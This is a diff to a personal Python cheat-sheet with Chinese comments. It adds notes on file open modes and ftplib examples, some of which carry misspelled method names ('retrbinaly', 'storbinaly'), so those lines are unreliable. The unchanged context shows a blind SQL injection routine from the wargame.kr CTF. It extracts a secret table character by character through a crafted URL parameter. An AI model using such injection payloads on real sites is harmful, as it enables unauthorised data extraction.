@@ -105,10 +105,24 @@ hashlib.md5('hhh').hexdigest()
 # [time]
 import time
 time.sleep(1)# sleep 1 seconds
+# [os]
 
 # [re]
 
 # [open]
+'''
+w 写方式
+a 追加模式打开（从EOF开始，必要时创建新文件）
+r+ 以读写模式打开
+w+ 以读写模式打开
+a+ 以读写模式打开
+rb 以二进制读模式打开
+wb 以二进制写模式打开 (参见 w )
+ab 以二进制追加模式打开 (参见 a )
+rb+ 以二进制读写模式打开 (参见 r+ )
+wb+ 以二进制读写模式打开 (参见 w+ )
+ab+ 以二进制读写模式打开 (参见 a+ )
+'''
 f = open("data3.txt") 
 line = f.readline() 
 lines = f.readlines()#when file is small you can use it 
@@ -138,6 +152,35 @@ soup = BeautifulSoup(res.content, 'html.parser', from_encoding='utf-8')
 soup.find_all(id='papelist')
 soup.find_all('div',attrs={'id':'article_list'})
 soup.find_all(attrs={'class':"link_title"})
+
+# [ftp]
+from ftplib import FTP            #加载ftp模块
+ftp=FTP()                         #设置变量
+ftp.set_debuglevel(2)             #打开调试级别2，显示详细信息
+ftp.connect("IP","port")          #连接的ftp sever和端口
+ftp.login("user","password")      #连接的用户名，密码
+print ftp.getwelcome()            #打印出欢迎信息
+ftp.cwd("xxx/xxx")                #进入远程目录
+bufsize=1024                      #设置的缓冲区大小
+filename="filename.txt"           #需要下载的文件
+file_handle=open(filename,"wb").write #以写模式在本地打开文件
+ftp.retrbinaly("RETR filename.txt",file_handle,bufsize) #接收服务器上文件并写入本地文件
+ftp.set_debuglevel(0)             #关闭调试模式
+ftp.quit()                        #退出ftp
+
+
+ftp相关命令操作
+ftp.cwd(pathname)                 #设置FTP当前操作的路径
+ftp.dir()                         #显示目录下所有目录信息
+ftp.nlst()                        #获取目录下的文件
+ftp.mkd(pathname)                 #新建远程目录
+ftp.pwd()                         #返回当前所在位置
+ftp.rmd(dirname)                  #删除远程目录
+ftp.delete(filename)              #删除远程文件
+ftp.rename(fromname, toname)#将fromname修改名称为toname。
+ftp.storbinaly("STOR filename.txt",file_handel,bufsize)  #上传目标文件
+ftp.retrbinary("RETR filename.txt",file_handel,bufsize)  #下载FTP文件
+
 # 2.functions
 
 def rand_str()
@@ -229,6 +272,7 @@ string = ''
 def charge(mid,i):#判断大小
     url='http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=if(ascii(substr((select group_concat(readme) from chat_log_secret),{0},1))<={1},10000000000,23334)'.format(str(i),str(mid))
     #
+    
     s=requests.get(url=url)
     content=s.content
     length=len(content)
